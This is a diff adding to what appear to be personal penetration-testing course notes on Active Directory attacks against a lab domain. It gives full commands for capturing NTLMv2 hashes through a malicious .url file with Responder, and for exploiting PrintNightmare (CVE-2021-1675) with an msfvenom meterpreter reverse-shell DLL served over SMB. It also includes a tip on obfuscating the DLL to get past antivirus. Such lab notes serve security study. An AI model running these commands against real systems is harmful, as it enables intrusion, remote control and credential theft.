@@ -3422,3 +3422,96 @@ fcastle::TREE:51934501eb00515e:9ABE5E3F30739166896A5BEEA3D0621F:0101000000000000
 
 ![[Pasted image 20230329170636.png]]
 
+
+### URL File Attacks
+
+> [!info] 
+>  Chapter Info:
+>  Active Directory Attacks - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share)
+
+``` 
+[InternetShortcut]
+URL=blah
+WorkingDirectory=blah
+IconFile=\\x.x.x.x\%USERNAME%.icon
+IconIndex=1
+```
+
+> [!todo] 
+> Put IP of your Kali (Attacker) Machine.
+> Safe this content to File Share and use filename like this:  `"@test.url"`  (Including quotes)
+
+![[Pasted image 20230330161351.png]]
+
+> [!todo] 
+> On Kali VM:
+> `sudo responder -I eth0 -v`
+> 
+
+> [!info] 
+> When no someone go to this share, automatically this request is send out to our Kali
+> 
+
+![[Pasted image 20230330161612.png]]
+
+> [!info] 
+> You can use this NTLMv2 Hash to relay to target you like to access
+> 
+
+> [!warning] 
+> As a reminder: NTLMv2 can't be bruteforced
+> 
+
+
+### PrintNightmare (CVE-2021-1675) Walkthrough
+
+> [!info] 
+> Lession Info:
+>  cube0x0 RCE - [https://github.com/cube0x0/CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675)
+>  calebstewart LPE - [https://github.com/calebstewart/CVE-2021-1675](https://github.com/calebstewart/CVE-2021-1675)
+
+> [!todo] 
+> See if DC is vulnerable for PrintNightmare:
+> `impacket-rpcdump @192.168.203.136 | egrep 'MS-RPRN|MS-PAR' ` 
+
+![[Pasted image 20230330162401.png]]
+
+> [!todo] 
+> Download  PrintNightmare from Github (cube0x0 RCE) on your Kali
+
+> [!todo] 
+> Create Malicious DLL Reverse Shell :
+> `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.203.135 LPORT=5555 -f dll > shell.dll` 
+
+> [!todo] 
+> Start Listener:
+> `msfconsole` 
+> `use multi/handler`
+> `set payload windows/x64/meterpreter/reverse_tcp`
+> `set lport 5555`
+> `set lhost eth0`
+> `run`
+
+![[Pasted image 20230330163702.png]]
+
+> [!todo] 
+> At folder where DLL is which we created, run:
+> `impacket-smbserver share ./ 'pwd' -smb2support` 
+
+> [!todo] 
+> Run PrinterNightmare.py on Kali:
+>  `./PrintNightmare.py marvel.local/fcastle:Password1@192.168.203.136 '\\192.168.203.135\share\shell.dll'`
+
+![[Pasted image 20230330165432.png]]
+
+> [!attention] 
+> If Server Antivirus detect malicious `dll`, you have to obfuscate dll.
+> 
+
+
+### Mimikatz Overview
+
+> [!info] 
+> Resources for this video:
+> Mimikatz: [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz) 
+
